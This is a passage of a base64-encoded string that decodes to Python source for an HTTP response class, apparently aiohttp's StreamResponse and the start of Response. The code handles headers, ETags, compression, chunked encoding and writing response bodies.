ElGSUVEKSlcclxuXHJcbiAgICBAbGFzdF9tb2RpZmllZC5zZXR0ZXJcclxuICAgIGRlZiBsYXN0X21vZGlmaWVkKFxyXG4gICAgICAgIHNlbGYsIHZhbHVlOiBPcHRpb25hbFtVbmlvbltpbnQsIGZsb2F0LCBkYXRldGltZS5kYXRldGltZSwgc3RyXV1cclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiB2YWx1ZSBpcyBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFkZXJzLnBvcChoZHJzLkxBU1RfTU9ESUZJRUQsIE5vbmUpXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKHZhbHVlLCAoaW50LCBmbG9hdCkpOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFkZXJzW2hkcnMuTEFTVF9NT0RJRklFRF0gPSB0aW1lLnN0cmZ0aW1lKFxyXG4gICAgICAgICAgICAgICAgIiVhLCAlZCAlYiAlWSAlSDolTTolUyBHTVQiLCB0aW1lLmdtdGltZShtYXRoLmNlaWwodmFsdWUpKVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKHZhbHVlLCBkYXRldGltZS5kYXRldGltZSk6XHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5MQVNUX01PRElGSUVEXSA9IHRpbWUuc3RyZnRpbWUoXHJcbiAgICAgICAgICAgICAgICAiJWEsICVkICViICVZICVIOiVNOiVTIEdNVCIsIHZhbHVlLnV0Y3RpbWV0dXBsZSgpXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbGlmIGlzaW5zdGFuY2UodmFsdWUsIHN0cik6XHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5MQVNUX01PRElGSUVEXSA9IHZhbHVlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZXRhZyhzZWxmKSAtPiBPcHRpb25hbFtFVGFnXTpcclxuICAgICAgICBxdW90ZWRfdmFsdWUgPSBzZWxmLl9oZWFkZXJzLmdldChoZHJzLkVUQUcpXHJcbiAgICAgICAgaWYgbm90IHF1b3RlZF92YWx1ZTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuICAgICAgICBlbGlmIHF1b3RlZF92YWx1ZSA9PSBFVEFHX0FOWTpcclxuICAgICAgICAgICAgcmV0dXJuIEVUYWcodmFsdWU9RVRBR19BTlkpXHJcbiAgICAgICAgbWF0Y2ggPSBRVU9URURfRVRBR19SRS5mdWxsbWF0Y2gocXVvdGVkX3ZhbHVlKVxyXG4gICAgICAgIGlmIG5vdCBtYXRjaDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuICAgICAgICBpc193ZWFrLCB2YWx1ZSA9IG1hdGNoLmdyb3VwKDEsIDIpXHJcbiAgICAgICAgcmV0dXJuIEVUYWcoXHJcbiAgICAgICAgICAgIGlzX3dlYWs9Ym9vbChpc193ZWFrKSxcclxuICAgICAgICAgICAgdmFsdWU9dmFsdWUsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBldGFnLnNldHRlclxyXG4gICAgZGVmIGV0YWcoc2VsZiwgdmFsdWU6IE9wdGlvbmFsW1VuaW9uW0VUYWcsIHN0cl1dKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHZhbHVlIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnMucG9wKGhkcnMuRVRBRywgTm9uZSlcclxuICAgICAgICBlbGlmIChpc2luc3RhbmNlKHZhbHVlLCBzdHIpIGFuZCB2YWx1ZSA9PSBFVEFHX0FOWSkgb3IgKFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKHZhbHVlLCBFVGFnKSBhbmQgdmFsdWUudmFsdWUgPT0gRVRBR19BTllcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFkZXJzW2hkcnMuRVRBR10gPSBFVEFHX0FOWVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZSh2YWx1ZSwgc3RyKTpcclxuICAgICAgICAgICAgdmFsaWRhdGVfZXRhZ192YWx1ZSh2YWx1ZSlcclxuICAgICAgICAgICAgc2VsZi5faGVhZGVyc1toZHJzLkVUQUddID0gZlwnInt2YWx1ZX0iXCdcclxuICAgICAgICBlbGlmIGlzaW5zdGFuY2UodmFsdWUsIEVUYWcpIGFuZCBpc2luc3RhbmNlKHZhbHVlLnZhbHVlLCBzdHIpOlxyXG4gICAgICAgICAgICB2YWxpZGF0ZV9ldGFnX3ZhbHVlKHZhbHVlLnZhbHVlKVxyXG4gICAgICAgICAgICBoZHJfdmFsdWUgPSBmXCdXLyJ7dmFsdWUudmFsdWV9IlwnIGlmIHZhbHVlLmlzX3dlYWsgZWxzZSBmXCcie3ZhbHVlLnZhbHVlfSJcJ1xyXG4gICAgICAgICAgICBzZWxmLl9oZWFkZXJzW2hkcnMuRVRBR10gPSBoZHJfdmFsdWVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgZiJVbnN1cHBvcnRlZCBldGFnIHR5cGU6IHt0eXBlKHZhbHVlKX0uICJcclxuICAgICAgICAgICAgICAgIGYiZXRhZyBtdXN0IGJlIHN0ciwgRVRhZyBvciBOb25lIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9nZW5lcmF0ZV9jb250ZW50X3R5cGVfaGVhZGVyKFxyXG4gICAgICAgIHNlbGYsIENPTlRFTlRfVFlQRTogaXN0ciA9IGhkcnMuQ09OVEVOVF9UWVBFXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX2NvbnRlbnRfZGljdCBpcyBub3QgTm9uZVxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9jb250ZW50X3R5cGUgaXMgbm90IE5vbmVcclxuICAgICAgICBwYXJhbXMgPSAiOyAiLmpvaW4oZiJ7a309e3Z9IiBmb3IgaywgdiBpbiBzZWxmLl9jb250ZW50X2RpY3QuaXRlbXMoKSlcclxuICAgICAgICBpZiBwYXJhbXM6XHJcbiAgICAgICAgICAgIGN0eXBlID0gc2VsZi5fY29udGVudF90eXBlICsgIjsgIiArIHBhcmFtc1xyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGN0eXBlID0gc2VsZi5fY29udGVudF90eXBlXHJcbiAgICAgICAgc2VsZi5faGVhZGVyc1tDT05URU5UX1RZUEVdID0gY3R5cGVcclxuXHJcbiAgICBhc3luYyBkZWYgX2RvX3N0YXJ0X2NvbXByZXNzaW9uKHNlbGYsIGNvZGluZzogQ29udGVudENvZGluZykgLT4gTm9uZTpcclxuICAgICAgICBpZiBjb2RpbmcgIT0gQ29udGVudENvZGluZy5pZGVudGl0eTpcclxuICAgICAgICAgICAgYXNzZXJ0IHNlbGYuX3BheWxvYWRfd3JpdGVyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5DT05URU5UX0VOQ09ESU5HXSA9IGNvZGluZy52YWx1ZVxyXG4gICAgICAgICAgICBzZWxmLl9wYXlsb2FkX3dyaXRlci5lbmFibGVfY29tcHJlc3Npb24oY29kaW5nLnZhbHVlKVxyXG4gICAgICAgICAgICAjIENvbXByZXNzZWQgcGF5bG9hZCBtYXkgaGF2ZSBkaWZmZXJlbnQgY29udGVudCBsZW5ndGgsXHJcbiAgICAgICAgICAgICMgcmVtb3ZlIHRoZSBoZWFkZXJcclxuICAgICAgICAgICAgc2VsZi5faGVhZGVycy5wb3BhbGwoaGRycy5DT05URU5UX0xFTkdUSCwgTm9uZSlcclxuXHJcbiAgICBhc3luYyBkZWYgX3N0YXJ0X2NvbXByZXNzaW9uKHNlbGYsIHJlcXVlc3Q6ICJCYXNlUmVxdWVzdCIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fY29tcHJlc3Npb25fZm9yY2U6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX2RvX3N0YXJ0X2NvbXByZXNzaW9uKHNlbGYuX2NvbXByZXNzaW9uX2ZvcmNlKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGFjY2VwdF9lbmNvZGluZyA9IHJlcXVlc3QuaGVhZGVycy5nZXQoaGRycy5BQ0NFUFRfRU5DT0RJTkcsICIiKS5sb3dlcigpXHJcbiAgICAgICAgICAgIGZvciBjb2RpbmcgaW4gQ29udGVudENvZGluZzpcclxuICAgICAgICAgICAgICAgIGlmIGNvZGluZy52YWx1ZSBpbiBhY2NlcHRfZW5jb2Rpbmc6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5fZG9fc3RhcnRfY29tcHJlc3Npb24oY29kaW5nKVxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgIGFzeW5jIGRlZiBwcmVwYXJlKHNlbGYsIHJlcXVlc3Q6ICJCYXNlUmVxdWVzdCIpIC0+IE9wdGlvbmFsW0Fic3RyYWN0U3RyZWFtV3JpdGVyXTpcclxuICAgICAgICBpZiBzZWxmLl9lb2Zfc2VudDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuICAgICAgICBpZiBzZWxmLl9wYXlsb2FkX3dyaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3BheWxvYWRfd3JpdGVyXHJcblxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9zdGFydChyZXF1ZXN0KVxyXG5cclxuICAgIGFzeW5jIGRlZiBfc3RhcnQoc2VsZiwgcmVxdWVzdDogIkJhc2VSZXF1ZXN0IikgLT4gQWJzdHJhY3RTdHJlYW1Xcml0ZXI6XHJcbiAgICAgICAgc2VsZi5fcmVxID0gcmVxdWVzdFxyXG4gICAgICAgIHdyaXRlciA9IHNlbGYuX3BheWxvYWRfd3JpdGVyID0gcmVxdWVzdC5fcGF5bG9hZF93cml0ZXJcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fcHJlcGFyZV9oZWFkZXJzKClcclxuICAgICAgICBhd2FpdCByZXF1ZXN0Ll9wcmVwYXJlX2hvb2soc2VsZilcclxuICAgICAgICBhd2FpdCBzZWxmLl93cml0ZV9oZWFkZXJzKClcclxuXHJcbiAgICAgICAgcmV0dXJuIHdyaXRlclxyXG5cclxuICAgIGFzeW5jIGRlZiBfcHJlcGFyZV9oZWFkZXJzKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcmVxdWVzdCA9IHNlbGYuX3JlcVxyXG4gICAgICAgIGFzc2VydCByZXF1ZXN0IGlzIG5vdCBOb25lXHJcbiAgICAgICAgd3JpdGVyID0gc2VsZi5fcGF5bG9hZF93cml0ZXJcclxuICAgICAgICBhc3NlcnQgd3JpdGVyIGlzIG5vdCBOb25lXHJcbiAgICAgICAga2VlcF9hbGl2ZSA9IHNlbGYuX2tlZXBfYWxpdmVcclxuICAgICAgICBpZiBrZWVwX2FsaXZlIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGtlZXBfYWxpdmUgPSByZXF1ZXN0LmtlZXBfYWxpdmVcclxuICAgICAgICBzZWxmLl9rZWVwX2FsaXZlID0ga2VlcF9hbGl2ZVxyXG5cclxuICAgICAgICB2ZXJzaW9uID0gcmVxdWVzdC52ZXJzaW9uXHJcblxyXG4gICAgICAgIGhlYWRlcnMgPSBzZWxmLl9oZWFkZXJzXHJcbiAgICAgICAgZm9yIGNvb2tpZSBpbiBzZWxmLl9jb29raWVzLnZhbHVlcygpOlxyXG4gICAgICAgICAgICB2YWx1ZSA9IGNvb2tpZS5vdXRwdXQoaGVhZGVyPSIiKVsxOl1cclxuICAgICAgICAgICAgaGVhZGVycy5hZGQoaGRycy5TRVRfQ09PS0lFLCB2YWx1ZSlcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fY29tcHJlc3Npb246XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3N0YXJ0X2NvbXByZXNzaW9uKHJlcXVlc3QpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2NodW5rZWQ6XHJcbiAgICAgICAgICAgIGlmIHZlcnNpb24gIT0gSHR0cFZlcnNpb24xMTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiVXNpbmcgY2h1bmtlZCBlbmNvZGluZyBpcyBmb3JiaWRkZW4gIlxyXG4gICAgICAgICAgICAgICAgICAgICJmb3IgSFRUUC97MC5tYWpvcn0uezAubWlub3J9Ii5mb3JtYXQocmVxdWVzdC52ZXJzaW9uKVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICB3cml0ZXIuZW5hYmxlX2NodW5raW5nKClcclxuICAgICAgICAgICAgaGVhZGVyc1toZHJzLlRSQU5TRkVSX0VOQ09ESU5HXSA9ICJjaHVua2VkIlxyXG4gICAgICAgICAgICBpZiBoZHJzLkNPTlRFTlRfTEVOR1RIIGluIGhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICBkZWwgaGVhZGVyc1toZHJzLkNPTlRFTlRfTEVOR1RIXVxyXG4gICAgICAgIGVsaWYgc2VsZi5fbGVuZ3RoX2NoZWNrOlxyXG4gICAgICAgICAgICB3cml0ZXIubGVuZ3RoID0gc2VsZi5jb250ZW50X2xlbmd0aFxyXG4gICAgICAgICAgICBpZiB3cml0ZXIubGVuZ3RoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICBpZiB2ZXJzaW9uID49IEh0dHBWZXJzaW9uMTEgYW5kIHNlbGYuc3RhdHVzICE9IDIwNDpcclxuICAgICAgICAgICAgICAgICAgICB3cml0ZXIuZW5hYmxlX2NodW5raW5nKClcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzW2hkcnMuVFJBTlNGRVJfRU5DT0RJTkddID0gImNodW5rZWQiXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgaGRycy5DT05URU5UX0xFTkdUSCBpbiBoZWFkZXJzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWwgaGVhZGVyc1toZHJzLkNPTlRFTlRfTEVOR1RIXVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBrZWVwX2FsaXZlID0gRmFsc2VcclxuICAgICAgICAgICAgIyBIVFRQIDEuMTogaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzAjc2VjdGlvbi0zLjMuMlxyXG4gICAgICAgICAgICAjIEhUVFAgMS4wOiBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjMTk0NSNzZWN0aW9uLTEwLjRcclxuICAgICAgICAgICAgZWxpZiB2ZXJzaW9uID49IEh0dHBWZXJzaW9uMTEgYW5kIHNlbGYuc3RhdHVzIGluICgxMDAsIDEwMSwgMTAyLCAxMDMsIDIwNCk6XHJcbiAgICAgICAgICAgICAgICBkZWwgaGVhZGVyc1toZHJzLkNPTlRFTlRfTEVOR1RIXVxyXG5cclxuICAgICAgICBpZiBzZWxmLnN0YXR1cyBub3QgaW4gKDIwNCwgMzA0KTpcclxuICAgICAgICAgICAgaGVhZGVycy5zZXRkZWZhdWx0KGhkcnMuQ09OVEVOVF9UWVBFLCAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIilcclxuICAgICAgICBoZWFkZXJzLnNldGRlZmF1bHQoaGRycy5EQVRFLCByZmM4MjJfZm9ybWF0dGVkX3RpbWUoKSlcclxuICAgICAgICBoZWFkZXJzLnNldGRlZmF1bHQoaGRycy5TRVJWRVIsIFNFUlZFUl9TT0ZUV0FSRSlcclxuXHJcbiAgICAgICAgIyBjb25uZWN0aW9uIGhlYWRlclxyXG4gICAgICAgIGlmIGhkcnMuQ09OTkVDVElPTiBub3QgaW4gaGVhZGVyczpcclxuICAgICAgICAgICAgaWYga2VlcF9hbGl2ZTpcclxuICAgICAgICAgICAgICAgIGlmIHZlcnNpb24gPT0gSHR0cFZlcnNpb24xMDpcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzW2hkcnMuQ09OTkVDVElPTl0gPSAia2VlcC1hbGl2ZSJcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGlmIHZlcnNpb24gPT0gSHR0cFZlcnNpb24xMTpcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzW2hkcnMuQ09OTkVDVElPTl0gPSAiY2xvc2UiXHJcblxyXG4gICAgYXN5bmMgZGVmIF93cml0ZV9oZWFkZXJzKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcmVxdWVzdCA9IHNlbGYuX3JlcVxyXG4gICAgICAgIGFzc2VydCByZXF1ZXN0IGlzIG5vdCBOb25lXHJcbiAgICAgICAgd3JpdGVyID0gc2VsZi5fcGF5bG9hZF93cml0ZXJcclxuICAgICAgICBhc3NlcnQgd3JpdGVyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgIyBzdGF0dXMgbGluZVxyXG4gICAgICAgIHZlcnNpb24gPSByZXF1ZXN0LnZlcnNpb25cclxuICAgICAgICBzdGF0dXNfbGluZSA9ICJIVFRQL3t9Lnt9IHt9IHt9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgIHZlcnNpb25bMF0sIHZlcnNpb25bMV0sIHNlbGYuX3N0YXR1cywgc2VsZi5fcmVhc29uXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGF3YWl0IHdyaXRlci53cml0ZV9oZWFkZXJzKHN0YXR1c19saW5lLCBzZWxmLl9oZWFkZXJzKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZShzZWxmLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgZGF0YSwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpXHJcbiAgICAgICAgKSwgImRhdGEgYXJndW1lbnQgbXVzdCBiZSBieXRlLWlzaCAoJXIpIiAlIHR5cGUoZGF0YSlcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fZW9mX3NlbnQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ2Fubm90IGNhbGwgd3JpdGUoKSBhZnRlciB3cml0ZV9lb2YoKSIpXHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZF93cml0ZXIgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYW5ub3QgY2FsbCB3cml0ZSgpIGJlZm9yZSBwcmVwYXJlKCkiKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLl9wYXlsb2FkX3dyaXRlci53cml0ZShkYXRhKVxyXG5cclxuICAgIGFzeW5jIGRlZiBkcmFpbihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGFzc2VydCBub3Qgc2VsZi5fZW9mX3NlbnQsICJFT0YgaGFzIGFscmVhZHkgYmVlbiBzZW50IlxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9wYXlsb2FkX3dyaXRlciBpcyBub3QgTm9uZSwgIlJlc3BvbnNlIGhhcyBub3QgYmVlbiBzdGFydGVkIlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJkcmFpbiBtZXRob2QgaXMgZGVwcmVjYXRlZCwgdXNlIGF3YWl0IHJlc3Aud3JpdGUoKSIsXHJcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgIClcclxuICAgICAgICBhd2FpdCBzZWxmLl9wYXlsb2FkX3dyaXRlci5kcmFpbigpXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlX2VvZihzZWxmLCBkYXRhOiBieXRlcyA9IGIiIikgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgZGF0YSwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpXHJcbiAgICAgICAgKSwgImRhdGEgYXJndW1lbnQgbXVzdCBiZSBieXRlLWlzaCAoJXIpIiAlIHR5cGUoZGF0YSlcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fZW9mX3NlbnQ6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBhc3NlcnQgc2VsZi5fcGF5bG9hZF93cml0ZXIgaXMgbm90IE5vbmUsICJSZXNwb25zZSBoYXMgbm90IGJlZW4gc3RhcnRlZCJcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fcGF5bG9hZF93cml0ZXIud3JpdGVfZW9mKGRhdGEpXHJcbiAgICAgICAgc2VsZi5fZW9mX3NlbnQgPSBUcnVlXHJcbiAgICAgICAgc2VsZi5fcmVxID0gTm9uZVxyXG4gICAgICAgIHNlbGYuX2JvZHlfbGVuZ3RoID0gc2VsZi5fcGF5bG9hZF93cml0ZXIub3V0cHV0X3NpemVcclxuICAgICAgICBzZWxmLl9wYXlsb2FkX3dyaXRlciA9IE5vbmVcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIGlmIHNlbGYuX2VvZl9zZW50OlxyXG4gICAgICAgICAgICBpbmZvID0gImVvZiJcclxuICAgICAgICBlbGlmIHNlbGYucHJlcGFyZWQ6XHJcbiAgICAgICAgICAgIGFzc2VydCBzZWxmLl9yZXEgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgaW5mbyA9IGYie3NlbGYuX3JlcS5tZXRob2R9IHtzZWxmLl9yZXEucGF0aH0gIlxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGluZm8gPSAibm90IHByZXBhcmVkIlxyXG4gICAgICAgIHJldHVybiBmIjx7c2VsZi5fX2NsYXNzX18uX19uYW1lX199IHtzZWxmLnJlYXNvbn0ge2luZm99PiJcclxuXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwga2V5OiBzdHIpIC0+IEFueTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fc3RhdGVba2V5XVxyXG5cclxuICAgIGRlZiBfX3NldGl0ZW1fXyhzZWxmLCBrZXk6IHN0ciwgdmFsdWU6IEFueSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9zdGF0ZVtrZXldID0gdmFsdWVcclxuXHJcbiAgICBkZWYgX19kZWxpdGVtX18oc2VsZiwga2V5OiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgZGVsIHNlbGYuX3N0YXRlW2tleV1cclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9zdGF0ZSlcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gSXRlcmF0b3Jbc3RyXTpcclxuICAgICAgICByZXR1cm4gaXRlcihzZWxmLl9zdGF0ZSlcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKGlkKHNlbGYpKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZiBpcyBvdGhlclxyXG5cclxuXHJcbmNsYXNzIFJlc3BvbnNlKFN0cmVhbVJlc3BvbnNlKTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgYm9keTogQW55ID0gTm9uZSxcclxuICAgICAgICBzdGF0dXM6IGludCA9IDIwMCxcclxuICAgICAgICByZWFzb246IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIHRleHQ6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIGNvbnRlbnRfdHlwZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgY2hhcnNldDogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgemxpYl9leGVjdXRvcl9zaXplOiBPcHRpb25hbFtpbnRdID0gTm9uZSxcclxuICAgICAgICB6bGliX2V4ZWN1dG9yOiBPcHRpb25hbFtFeGVjdXRvcl0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGJvZHkgaXMgbm90IE5vbmUgYW5kIHRleHQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImJvZHkgYW5kIHRleHQgYXJlIG5vdCBhbGxvd2VkIHRvZ2V0aGVyIilcclxuXHJcbiAgICAgICAgaWYgaGVhZGVycyBpcyBOb25lOlxyXG4gICAgICAgICAgICByZWFsX2hlYWRlcnMgPSBDSU11bHRpRGljdCgpICAjIHR5cGU6IENJTXVsdGlEaWN0W3N0cl1cclxuICAgICAgICBlbGlmIG5vdCBpc2luc3RhbmNlKGhlYWRlcnMsIENJTXVsdGlEaWN0KTpcclxuICAgICAgICAgICAgcmVhbF9oZWFkZXJzID0gQ0lNdWx0aURpY3QoaGVhZGVycylcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZWFsX2hlYWRlcnMgPSBoZWFkZXJzICAjID0gY2FzdChcJ0NJTXVsdGlEaWN0W3N0cl1cJywgaGVhZGVycylcclxuXHJcbiAgICAgICAgaWYgY29udGVudF90eXBlIGlzIG5vdCBOb25lIGFuZCAiY2hhcnNldCIgaW4gY29udGVudF90eXBlOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJjaGFyc2V0IG11c3Qgbm90IGJlIGluIGNvbnRlbnRfdHlwZSAiICJhcmd1bWVudCIpXHJcblxyXG4gICAgICAgIGlmIHRleHQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGlmIGhkcnMuQ09OVEVOVF9UWVBFIGluIHJlYWxfaGVhZGVyczpcclxuICAgICAgICAgICAgICAgIGlmIGNvbnRlbnRfdHlwZSBvciBjaGFyc2V0OlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJwYXNzaW5nIGJvdGggQ29udGVudC1UeXBlIGhlYWRlciBhbmQgIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiY29udGVudF90eXBlIG9yIGNoYXJzZXQgcGFyYW1zICJcclxuICAgICAgICAgICAgICAgICAgICAgICAgImlzIGZvcmJpZGRlbiJcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAjIGZhc3QgcGF0aCBmb3IgZmlsbGluZyBoZWFkZXJzXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh0ZXh0LCBzdHIpOlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidGV4dCBhcmd1bWVudCBtdXN0IGJlIHN0ciAoJXIpIiAlIHR5cGUodGV4dCkpXHJcbiAgICAgICAgICAgICAgICBpZiBjb250ZW50X3R5cGUgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICBjb250ZW50X3R5cGUgPSAidGV4dC9wbGFpbiJcclxuICAgICAgICAgICAgICAgIGlmIGNoYXJzZXQgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICBjaGFyc2V0ID0gInV0Zi04IlxyXG4gICAgICAgICAgICAgICAgcmVhbF9oZWFkZXJzW2hkcnMuQ09OVEVOVF9UWVBFXSA9IGNvbnRlbnRfdHlwZSArICI7IGNoYXJzZXQ9IiArIGNoYXJzZXRcclxuICAgICAgICAgICAgICAgIGJvZHkgPSB0ZXh0LmVuY29kZShjaGFyc2V0KVxyXG4gICAgICAgICAgICAgICAgdGV4dCA9IE5vbmVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBpZiBoZHJzLkNPTlRFTlRfVFlQRSBpbiByZWFsX2hlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICBpZiBjb250ZW50X3R5cGUgaXMgbm90IE5vbmUgb3IgY2hhcnNldCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAicGFzc2luZyBib3RoIENvbnRlbnQtVHlwZSBoZWFkZXIgYW5kICJcclxuICAgICAgICAgICAgICAgICAgICAgICAgImNvbnRlbnRfdHlwZSBvciBjaGFyc2V0IHBhcmFtcyAiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJpcyBmb3JiaWRkZW4iXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgaWYgY29udGVudF90eXBlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGNoYXJzZXQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRfdHlwZSArPSAiOyBjaGFyc2V0PSIgKyBjaGFyc2V0XHJcbi